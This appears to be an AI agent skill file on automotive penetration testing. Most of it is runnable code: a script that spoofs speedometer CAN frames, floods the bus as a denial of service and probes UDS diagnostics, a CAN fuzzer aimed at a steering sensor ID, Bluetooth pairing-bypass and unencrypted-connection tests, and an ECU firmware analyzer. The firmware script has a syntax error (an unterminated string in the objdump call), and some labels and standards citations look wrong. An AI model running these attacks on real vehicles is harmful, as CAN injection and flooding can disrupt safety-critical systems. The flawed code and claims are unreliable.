# Automotive Penetration Testing Skill

## Overview

Expert skill for performing security assessments on automotive systems. Covers CAN fuzzing, wireless attacks (Bluetooth/WiFi), infotainment exploitation, ECU firmware reverse engineering, and specialized automotive pentest tools.

## Core Competencies

### Penetration Testing Methodology
- **Reconnaissance**: Asset discovery, attack surface mapping
- **Vulnerability Assessment**: Known CVEs, configuration issues
- **Exploitation**: Proof-of-concept attack development
- **Post-Exploitation**: Privilege escalation, lateral movement
- **Reporting**: Executive summary, technical findings, remediation roadmap

### Attack Vectors
- **CAN Bus**: Injection, spoofing, DoS, fuzzing
- **Wireless**: Bluetooth pairing bypass, WiFi WPA3 attacks
- **Infotainment**: Web browser exploitation, USB attacks
- **Diagnostics**: UDS brute-force, seed-key cracking
- **OTA**: MITM attacks, firmware downgrade

## Toolset

### Essential Tools
- **CANalyze**: CAN traffic analysis and injection
- **CarShark**: Wireshark for automotive protocols
- **ICSim**: Instrument Cluster Simulator for testing
- **can-utils**: Linux SocketCAN utilities
- **Metasploit**: Framework for exploitation
- **Burp Suite**: Web application testing (infotainment)

## CAN Bus Penetration Testing

### CAN Injection with can-utils

```bash
#!/bin/bash
# CAN Bus Penetration Testing Script
# Tests for basic CAN injection vulnerabilities

set -e

INTERFACE="can0"

echo "=== CAN Bus Penetration Test ==="
echo "[INFO] Interface: $INTERFACE"

# Setup CAN interface
setup_can() {
    echo "[1/5] Setting up CAN interface..."
    sudo ip link set $INTERFACE type can bitrate 500000
    sudo ip link set up $INTERFACE
    echo "[PASS] CAN interface configured (500 kbps)"
}

# Reconnaissance: Capture normal traffic
recon_traffic() {
    echo "[2/5] Reconnaissance: Capturing normal traffic..."
    candump $INTERFACE -n 1000 > /tmp/can_baseline.log
    echo "[INFO] Captured 1000 frames to /tmp/can_baseline.log"

    # Analyze unique CAN IDs
    cat /tmp/can_baseline.log | awk '{print $3}' | cut -d'#' -f1 | sort -u > /tmp/can_ids.txt
    CAN_ID_COUNT=$(wc -l < /tmp/can_ids.txt)
    echo "[INFO] Unique CAN IDs found: $CAN_ID_COUNT"
    head -10 /tmp/can_ids.txt
}

# Test 1: CAN Injection (Speedometer manipulation)
test_speedometer_injection() {
    echo "[3/5] Test 1: Speedometer Manipulation"

    # Common speedometer CAN IDs: 0x1A0 (VW), 0x0B4 (Toyota), 0x3E9 (Ford)
    SPEED_CAN_ID="1A0"

    echo "[INFO] Injecting fake speed messages (CAN ID: 0x$SPEED_CAN_ID)..."

    for speed_kmh in 0 50 100 150 200; do
        # Calculate payload (speed in km/h * 100, little-endian)
        speed_raw=$((speed_kmh * 100))
        low_byte=$((speed_raw & 0xFF))
        high_byte=$(((speed_raw >> 8) & 0xFF))

        payload=$(printf "%02X%02X000000000000" $low_byte $high_byte)

        echo "  [INJECT] Speed: ${speed_kmh} km/h -> Payload: $payload"
        cansend $INTERFACE ${SPEED_CAN_ID}#${payload}

        sleep 1
    done

    echo "[PASS] Speed injection test complete"
    echo "[FINDING] Speedometer accepts spoofed CAN messages without authentication"
}

# Test 2: CAN Flooding (DoS attack)
test_can_flooding() {
    echo "[4/5] Test 2: CAN Bus Flooding (DoS)"

    FLOOD_CAN_ID="7FF"  # High priority ID
    DURATION=5

    echo "[WARN] Flooding CAN bus for ${DURATION} seconds..."
    echo "[INFO] This may cause legitimate messages to be delayed/dropped"

    timeout $DURATION bash -c "while true; do cansend $INTERFACE ${FLOOD_CAN_ID}#DEADBEEFDEADBEEF; done" &
    FLOOD_PID=$!

    sleep $DURATION
    wait $FLOOD_PID 2>/dev/null || true

    echo "[PASS] Flooding test complete"
    echo "[FINDING] CAN bus has no rate limiting - vulnerable to DoS"
}

# Test 3: Diagnostic Protocol Attack (UDS)
test_uds_attack() {
    echo "[5/5] Test 3: UDS Diagnostic Attack"

    # UDS diagnostic request CAN ID: 0x7E0 (physical), 0x7DF (functional)
    UDS_REQUEST_ID="7E0"
    UDS_RESPONSE_ID="7E8"

    echo "[INFO] Sending UDS diagnostics session request..."

    # 0x10 0x01 = Start diagnostic session (default)
    cansend $INTERFACE ${UDS_REQUEST_ID}#021001000000000000

    sleep 0.1

    # Check for response
    timeout 2 candump $INTERFACE,${UDS_RESPONSE_ID}:7FF -n 1 > /tmp/uds_response.log 2>&1 || true

    if [ -s /tmp/uds_response.log ]; then
        echo "[PASS] ECU responded to UDS session request"
        cat /tmp/uds_response.log
        echo "[FINDING] ECU accepts UDS diagnostic commands without authentication"
    else
        echo "[FAIL] No UDS response received (ECU may require authentication)"
    fi
}

# Main execution
setup_can
recon_traffic
test_speedometer_injection
test_can_flooding
test_uds_attack

echo ""
echo "=== Penetration Test Summary ==="
echo "[CRITICAL] CAN bus has no message authentication (SecOC not implemented)"
echo "[HIGH] ECU vulnerable to message injection and spoofing"
echo "[HIGH] No rate limiting - DoS attacks possible"
echo "[MEDIUM] UDS diagnostic interface exposed without authentication"
echo ""
echo "Recommendations:"
echo "  1. Implement SecOC (Secure Onboard Communication) per AUTOSAR"
echo "  2. Add message authentication codes (MAC) to critical CAN IDs"
echo "  3. Implement gateway filtering and rate limiting"
echo "  4. Require seed-key authentication for UDS diagnostic access"
```

### CAN Fuzzing with Python

```python
#!/usr/bin/env python3
"""
CAN Bus Fuzzer for Vulnerability Discovery
Systematically tests CAN protocol implementation
"""

import can
import random
import time
from itertools import product

class CANFuzzer:
    """Intelligent CAN fuzzing framework"""

    def __init__(self, interface: str = 'can0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.crashes = []
        self.anomalies = []

        print(f"=== CAN Fuzzer Initialized ===")
        print(f"[INFO] Interface: {interface}")
        print(f"[WARN] Fuzzing may cause ECU crashes or vehicle malfunctions")

    def fuzz_can_ids(self, start_id: int = 0x000, end_id: int = 0x7FF, delay: float = 0.01):
        """Fuzz all possible CAN IDs"""
        print(f"\n[FUZZ] Testing CAN IDs 0x{start_id:03X} to 0x{end_id:03X}")

        for can_id in range(start_id, end_id + 1):
            payload = [0x00] * 8

            msg = can.Message(
                arbitration_id=can_id,
                data=payload,
                is_extended_id=False
            )

            try:
                self.bus.send(msg)
            except can.CanError as e:
                print(f"[ERROR] Failed to send CAN ID 0x{can_id:03X}: {e}")

            time.sleep(delay)

            if can_id % 100 == 0:
                print(f"[INFO] Progress: 0x{can_id:03X} / 0x{end_id:03X}")

        print(f"[PASS] CAN ID fuzzing complete")

    def fuzz_dlc(self, target_can_id: int):
        """Fuzz Data Length Code (DLC) field"""
        print(f"\n[FUZZ] Testing DLC values for CAN ID 0x{target_can_id:03X}")

        for dlc in range(0, 16):  # DLC 0-15 (valid: 0-8)
            # Generate payload of specified length
            if dlc <= 8:
                payload = [0xAA] * dlc
            else:
                payload = [0xAA] * 8  # Invalid DLC, max 8 bytes

            msg = can.Message(
                arbitration_id=target_can_id,
                data=payload,
                is_extended_id=False
            )

            print(f"  [TEST] DLC={dlc}, Payload={len(payload)} bytes")

            try:
                self.bus.send(msg)
            except Exception as e:
                print(f"  [ANOMALY] DLC={dlc} caused error: {e}")
                self.anomalies.append({'test': 'dlc_fuzz', 'dlc': dlc, 'error': str(e)})

            time.sleep(0.05)

        print(f"[PASS] DLC fuzzing complete")

    def fuzz_payload_random(self, target_can_id: int, iterations: int = 1000):
        """Random payload fuzzing"""
        print(f"\n[FUZZ] Random payload fuzzing (CAN ID 0x{target_can_id:03X}, {iterations} iterations)")

        for i in range(iterations):
            # Random payload length and content
            dlc = random.randint(0, 8)
            payload = [random.randint(0, 255) for _ in range(dlc)]

            msg = can.Message(
                arbitration_id=target_can_id,
                data=payload,
                is_extended_id=False
            )

            self.bus.send(msg)

            if i % 100 == 0:
                print(f"[INFO] Progress: {i} / {iterations}")

            time.sleep(0.001)

        print(f"[PASS] Random payload fuzzing complete")

    def fuzz_payload_boundary(self, target_can_id: int):
        """Boundary value fuzzing (edge cases)"""
        print(f"\n[FUZZ] Boundary value testing (CAN ID 0x{target_can_id:03X})")

        boundary_values = [
            [0x00] * 8,  # All zeros
            [0xFF] * 8,  # All ones
            [0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF],  # Alternating
            [0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],  # MSB set
            [0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],  # Max positive (signed)
            [0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA],  # Pattern 0b10101010
            [0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55],  # Pattern 0b01010101
        ]

        for idx, payload in enumerate(boundary_values):
            msg = can.Message(
                arbitration_id=target_can_id,
                data=payload,
                is_extended_id=False
            )

            print(f"  [TEST] Boundary case {idx + 1}: {payload}")
            self.bus.send(msg)
            time.sleep(0.1)

        print(f"[PASS] Boundary value fuzzing complete")

    def monitor_for_crashes(self, duration: int = 60):
        """Monitor CAN bus for crash indicators"""
        print(f"\n[MONITOR] Watching for ECU crashes ({duration}s)...")

        # Common crash indicators:
        # - Sudden stop of periodic messages
        # - Error frames on CAN bus
        # - Reset messages (e.g., CAN ID 0x000)

        message_counts = {}
        start_time = time.time()

        while (time.time() - start_time) < duration:
            msg = self.bus.recv(timeout=1.0)
            if msg is None:
                continue

            can_id = msg.arbitration_id

            if can_id not in message_counts:
                message_counts[can_id] = 0

            message_counts[can_id] += 1

        # Analyze for anomalies
        print(f"\n[ANALYSIS] Message statistics:")
        for can_id, count in sorted(message_counts.items()):
            print(f"  CAN ID 0x{can_id:03X}: {count} messages")

        print(f"[INFO] Monitoring complete - check ECU for unexpected behavior")

    def generate_report(self, output_file: str):
        """Generate fuzzing report"""
        with open(output_file, 'w') as f:
            f.write("CAN Bus Fuzzing Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Total anomalies detected: {len(self.anomalies)}\n")
            f.write(f"Total crashes detected: {len(self.crashes)}\n\n")

            f.write("Anomalies:\n")
            for anomaly in self.anomalies:
                f.write(f"  - {anomaly}\n")

            f.write("\nRecommendations:\n")
            f.write("  1. Fix input validation for identified anomalies\n")
            f.write("  2. Implement bounds checking on all CAN message fields\n")
            f.write("  3. Add graceful error handling (no crashes)\n")

        print(f"[INFO] Report generated: {output_file}")

# Example usage
def demo_can_fuzzing():
    fuzzer = CANFuzzer(interface='vcan0')

    # Fuzz specific CAN ID (e.g., steering angle sensor)
    target_id = 0x025

    fuzzer.fuzz_dlc(target_id)
    fuzzer.fuzz_payload_boundary(target_id)
    fuzzer.fuzz_payload_random(target_id, iterations=500)

    # Monitor for crashes
    fuzzer.monitor_for_crashes(duration=30)

    # Generate report
    fuzzer.generate_report('/tmp/can_fuzzing_report.txt')

if __name__ == "__main__":
    demo_can_fuzzing()
```

## Bluetooth Penetration Testing

```python
#!/usr/bin/env python3
"""
Bluetooth Penetration Testing for Vehicle Systems
Tests pairing, encryption, and authentication
"""

import bluetooth
import subprocess

class BluetoothPenTest:
    """Bluetooth security assessment"""

    def __init__(self):
        print("=== Bluetooth Penetration Test ===")

    def scan_devices(self):
        """Discover nearby Bluetooth devices"""
        print("\n[1/5] Scanning for Bluetooth devices...")

        devices = bluetooth.discover_devices(
            duration=8,
            lookup_names=True,
            flush_cache=True,
            lookup_class=True
        )

        print(f"[INFO] Found {len(devices)} devices:")

        for addr, name, device_class in devices:
            print(f"  {addr} - {name} (Class: 0x{device_class:06X})")

            # Identify automotive systems
            if "car" in name.lower() or "auto" in name.lower() or "vehicle" in name.lower():
                print(f"    [!] Potential vehicle system detected")

        return devices

    def test_pairing_bypass(self, target_addr: str):
        """Test for pairing bypass vulnerabilities"""
        print(f"\n[2/5] Testing pairing mechanisms for {target_addr}...")

        # Attempt to connect without pairing
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((target_addr, 1))

            print(f"[CRITICAL] Connected without pairing!")
            print(f"[FINDING] Device accepts connections without authentication")

            sock.close()

        except bluetooth.btcommon.BluetoothError as e:
            print(f"[INFO] Connection rejected (expected): {e}")

        # Test weak PIN codes
        weak_pins = ["0000", "1234", "1111", "0123"]

        print(f"[INFO] Testing common PIN codes...")
        for pin in weak_pins:
            print(f"  Trying PIN: {pin}")
            # Real implementation would use bluetoothctl or pybluez pairing

        print(f"[RECOMMENDATION] Use 6-digit random PIN or NFC pairing")

    def test_bluejacking(self, target_addr: str):
        """Test for bluejacking vulnerability (unsolicited messages)"""
        print(f"\n[3/5] Testing bluejacking (OBEX Push)...")

        # Attempt OBEX Push without pairing
        result = subprocess.run(
            ['obexftp', '-b', target_addr, '-B', '10', '-l'],
            capture_output=True,
            text=True
        )

        if result.returncode == 0:
            print(f"[HIGH] OBEX Push accessible without pairing")
            print(f"[FINDING] Attacker can send unsolicited files")
        else:
            print(f"[PASS] OBEX Push requires pairing")

    def test_service_discovery(self, target_addr: str):
        """Enumerate Bluetooth services (SDP)"""
        print(f"\n[4/5] Service Discovery (SDP)...")

        services = bluetooth.find_service(address=target_addr)

        if not services:
            print(f"[INFO] No services found (device may be in secure mode)")
            return

        print(f"[INFO] Found {len(services)} services:")

        for svc in services:
            print(f"  Service: {svc['name']}")
            print(f"    Protocol: {svc['protocol']}")
            print(f"    Port: {svc['port']}")
            print(f"    Service ID: {svc['service-id']}")

            # Flag suspicious services
            if 'OBD' in svc['name'] or 'Diagnostic' in svc['name']:
                print(f"    [!] Diagnostic service exposed over Bluetooth")

    def test_encryption_downgrade(self, target_addr: str):
        """Test for encryption downgrade attacks"""
        print(f"\n[5/5] Testing encryption downgrade...")

        # Attempt connection with no encryption
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)

        try:
            # Set security level to low (no encryption)
            sock.setsockopt(bluetooth.SOL_RFCOMM, bluetooth.RFCOMM_LM, 0)

            sock.connect((target_addr, 1))

            print(f"[CRITICAL] Connection accepted without encryption!")
            print(f"[FINDING] Bluetooth LE Legacy Pairing vulnerability")

            sock.close()

        except Exception as e:
            print(f"[PASS] Unencrypted connection rejected: {e}")

# Example usage
def demo_bluetooth_pentest():
    pentest = BluetoothPenTest()

    # Scan for devices
    devices = pentest.scan_devices()

    if devices:
        # Test first discovered device
        target_addr = devices[0][0]

        pentest.test_service_discovery(target_addr)
        pentest.test_pairing_bypass(target_addr)
        pentest.test_bluejacking(target_addr)
        pentest.test_encryption_downgrade(target_addr)

    print("\n=== Bluetooth Penetration Test Complete ===")

if __name__ == "__main__":
    demo_bluetooth_pentest()
```

## ECU Firmware Reverse Engineering

```python
#!/usr/bin/env python3
"""
ECU Firmware Reverse Engineering Toolkit
Binary analysis and vulnerability discovery
"""

import subprocess
import re
import os

class FirmwareAnalyzer:
    """Analyze ECU firmware binaries"""

    def __init__(self, firmware_path: str):
        self.firmware_path = firmware_path
        self.findings = []

        print(f"=== Firmware Analyzer ===")
        print(f"[INFO] Firmware: {firmware_path}")

    def extract_strings(self):
        """Extract printable strings from firmware"""
        print(f"\n[1/5] Extracting strings...")

        result = subprocess.run(
            ['strings', '-n', '8', self.firmware_path],
            capture_output=True,
            text=True
        )

        strings_output = result.stdout.split('\n')

        # Search for sensitive data
        sensitive_patterns = {
            'URLs': r'https?://[^\s]+',
            'IP Addresses': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
            'Emails': r'[\w\.-]+@[\w\.-]+\.\w+',
            'API Keys': r'[A-Za-z0-9]{32,}',
            'Passwords': r'(password|passwd|pwd)[\s:=]+\S+',
        }

        for category, pattern in sensitive_patterns.items():
            matches = [s for s in strings_output if re.search(pattern, s, re.IGNORECASE)]

            if matches:
                print(f"\n[FINDING] {category} found in firmware:")
                for match in matches[:5]:  # Show first 5
                    print(f"  - {match}")

                self.findings.append({
                    'category': category,
                    'severity': 'HIGH',
                    'count': len(matches)
                })

    def check_security_features(self):
        """Check for security mitigations"""
        print(f"\n[2/5] Checking security features...")

        # Check for NX (No Execute) bit
        result = subprocess.run(
            ['readelf', '-l', self.firmware_path],
            capture_output=True,
            text=True
        )

        if 'GNU_STACK' in result.stdout and 'RWE' not in result.stdout:
            print(f"[PASS] NX (DEP) enabled")
        else:
            print(f"[FAIL] NX disabled - stack is executable")
            self.findings.append({
                'issue': 'Missing NX protection',
                'severity': 'MEDIUM',
                'remediation': 'Compile with -z noexecstack'
            })

        # Check for PIE (Position Independent Executable)
        result = subprocess.run(
            ['readelf', '-h', self.firmware_path],
            capture_output=True,
            text=True
        )

        if 'DYN' in result.stdout:
            print(f"[PASS] PIE enabled")
        else:
            print(f"[FAIL] PIE disabled - ASLR ineffective")
            self.findings.append({
                'issue': 'Missing PIE',
                'severity': 'MEDIUM',
                'remediation': 'Compile with -fPIE -pie'
            })

        # Check for stack canaries
        result = subprocess.run(
            ['readelf', '-s', self.firmware_path],
            capture_output=True,
            text=True
        )

        if '__stack_chk_fail' in result.stdout:
            print(f"[PASS] Stack canaries present")
        else:
            print(f"[FAIL] No stack canaries - buffer overflow risk")
            self.findings.append({
                'issue': 'Missing stack canaries',
                'severity': 'HIGH',
                'remediation': 'Compile with -fstack-protector-strong'
            })

    def find_hardcoded_keys(self):
        """Search for hardcoded cryptographic keys"""
        print(f"\n[3/5] Searching for hardcoded keys...")

        # Use binwalk to find crypto signatures
        result = subprocess.run(
            ['binwalk', '-E', self.firmware_path],
            capture_output=True,
            text=True
        )

        # High entropy regions may contain keys
        if result.returncode == 0:
            print(f"[INFO] Entropy analysis complete")
            # Parse binwalk output for high entropy

        # Search for common key headers
        result = subprocess.run(
            ['strings', self.firmware_path],
            capture_output=True,
            text=True
        )

        key_indicators = ['-----BEGIN', 'RSA PRIVATE', 'ssh-rsa', 'PuTTY-User-Key']

        for indicator in key_indicators:
            if indicator in result.stdout:
                print(f"[CRITICAL] Hardcoded key found: {indicator}")
                self.findings.append({
                    'issue': f'Hardcoded key: {indicator}',
                    'severity': 'CRITICAL',
                    'remediation': 'Store keys in HSM or secure enclave'
                })

    def check_known_vulnerabilities(self):
        """Check for known vulnerable functions"""
        print(f"\n[4/5] Checking for known vulnerable functions...")

        dangerous_functions = [
            'strcpy', 'strcat', 'gets', 'sprintf', 'vsprintf',
            'scanf', 'sscanf', 'fscanf', 'vfscanf', 'realpath',
            'getwd', 'getpass', 'streadd', 'strecpy', 'strtrns'
        ]

        result = subprocess.run(
            ['nm', '-D', self.firmware_path],
            capture_output=True,
            text=True
        )

        for func in dangerous_functions:
            if func in result.stdout:
                print(f"[WARN] Dangerous function used: {func}()")
                self.findings.append({
                    'issue': f'Use of {func}()',
                    'severity': 'MEDIUM',
                    'remediation': f'Replace with safe alternative (e.g., strncpy for strcpy)'
                })

    def disassemble_entry_point(self):
        """Disassemble entry point for analysis"""
        print(f"\n[5/5] Disassembling entry point...")

        result = subprocess.run(
            ['objdump', '-d', self.firmware_path, '-j', '.text', '--start-address=0', '--stop-address=256],
            capture_output=True,
            text=True
        )

        if result.returncode == 0:
            print(f"[INFO] Entry point disassembly:")
            print(result.stdout[:500])  # Show first 500 chars

    def generate_report(self, output_file: str):
        """Generate vulnerability report"""
        with open(output_file, 'w') as f:
            f.write("ECU Firmware Security Assessment Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Firmware: {os.path.basename(self.firmware_path)}\n")
            f.write(f"Total findings: {len(self.findings)}\n\n")

            # Group by severity
            critical = [f for f in self.findings if f.get('severity') == 'CRITICAL']
            high = [f for f in self.findings if f.get('severity') == 'HIGH']
            medium = [f for f in self.findings if f.get('severity') == 'MEDIUM']

            f.write(f"Critical: {len(critical)}\n")
            f.write(f"High: {len(high)}\n")
            f.write(f"Medium: {len(medium)}\n\n")

            f.write("Findings:\n")
            for finding in self.findings:
                f.write(f"\n[{finding.get('severity', 'INFO')}] ")
                f.write(f"{finding.get('issue', finding.get('category'))}\n")
                if 'remediation' in finding:
                    f.write(f"  Remediation: {finding['remediation']}\n")

        print(f"\n[INFO] Report generated: {output_file}")

# Example usage
def demo_firmware_analysis():
    analyzer = FirmwareAnalyzer('/tmp/ecu_firmware.elf')

    analyzer.extract_strings()
    analyzer.check_security_features()
    analyzer.find_hardcoded_keys()
    analyzer.check_known_vulnerabilities()
    analyzer.disassemble_entry_point()

    analyzer.generate_report('/tmp/firmware_security_report.txt')

if __name__ == "__main__":
    demo_firmware_analysis()
```

## Best Practices

1. **Scope & Authorization**: Always obtain written permission before testing
2. **Test Environment**: Use isolated test bench, never production vehicles
3. **Documentation**: Record all findings with PoC code and remediation guidance
4. **Responsible Disclosure**: Follow 90-day disclosure timeline per ISO 21434
5. **Tool Validation**: Verify tools don't cause permanent damage to ECUs

## References

- OWASP Automotive Security Testing Guide
- SAE J3061: Cybersecurity Guidebook for Cyber-Physical Vehicle Systems
- Charlie Miller & Chris Valasek: Car Hacking Research Papers
- NHTSA Cybersecurity Best Practices for Modern Vehicles
